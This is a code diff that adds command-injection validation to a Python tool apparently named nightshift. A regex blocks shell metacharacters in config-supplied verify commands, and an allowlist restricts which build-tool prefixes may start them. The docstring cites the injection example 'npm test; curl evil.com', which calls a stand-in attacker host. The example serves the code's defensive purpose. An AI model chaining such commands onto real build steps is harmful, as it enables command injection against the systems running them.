@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import re
 import shlex
 import subprocess
 import sys
@@ -10,7 +11,16 @@ import time
 from pathlib import Path
 from typing import IO
 
+from nightshift.core.constants import VERIFY_COMMAND_ALLOWLIST_PREFIXES
 from nightshift.core.errors import NightshiftError
+
+# Shell metacharacters that enable command injection when a command string is
+# passed verbatim to "bash -lc".  Any verify_command from an external config
+# file that contains these characters AND does not start with an allowlisted
+# prefix is rejected.
+# Includes newlines (\n, \r) which bash treats as command separators, and
+# redirections (>, <) which can read/write arbitrary files.
+_SHELL_METACHAR_RE: re.Pattern[str] = re.compile(r"[;&|`$\n\r><]")
 
 
 def _reader_thread(
@@ -133,6 +143,56 @@ def command_exists(name: str) -> bool:
             timeout=15,
         ).returncode
         == 0
+    )
+
+
+def validate_verify_command(command: str) -> None:
+    """Validate a verify_command value sourced from an external config file.
+
+    Raises NightshiftError if the command:
+    - Is empty or whitespace-only
+    - Contains shell metacharacters (;, |, backticks, $) that enable injection
+    - Does not start with a known-safe binary prefix
+
+    Shell metacharacters are always rejected, even for allowlisted prefixes,
+    because a command like "npm test; curl evil.com" is still an injection
+    attack.  The allowlist enforces that only recognized build-tool binaries
+    are used as the entry point.
+
+    Inferred commands (produced by nightshift itself, not from user config)
+    should also be validated here as a belt-and-suspenders check.
+    """
+    stripped = command.strip()
+    if not stripped:
+        raise NightshiftError("verify_command must not be empty")
+
+    # Always reject shell metacharacters -- no exceptions.
+    # Blocked: ; & | backtick $ (command substitution/chaining),
+    # \n \r (bash treats as command separators), > < (redirections).
+    if _SHELL_METACHAR_RE.search(stripped):
+        raise NightshiftError(
+            f"verify_command rejected: contains shell metacharacters "
+            f"(semicolons, pipes, redirections, newlines, or substitutions) "
+            f"that could enable injection. Command: {stripped!r}. "
+            f"Safe prefixes: npm, pnpm, yarn, bun, python3, cargo, go, make, "
+            f"bash nightshift/scripts/, sh nightshift/scripts/"
+        )
+
+    # Exact match for bare "make" (no arguments).
+    # Must be checked before the prefix loop to avoid matching "maker", etc.
+    if stripped == "make":
+        return
+
+    # Require the command to start with a known-safe binary prefix.
+    for prefix in VERIFY_COMMAND_ALLOWLIST_PREFIXES:
+        if stripped.startswith(prefix):
+            return
+
+    raise NightshiftError(
+        f"verify_command rejected: does not start with a known-safe prefix. "
+        f"Command: {stripped!r}. "
+        f"Safe prefixes: npm, pnpm, yarn, bun, python3, cargo, go, make, "
+        f"bash nightshift/scripts/, sh nightshift/scripts/"
     )
 
 
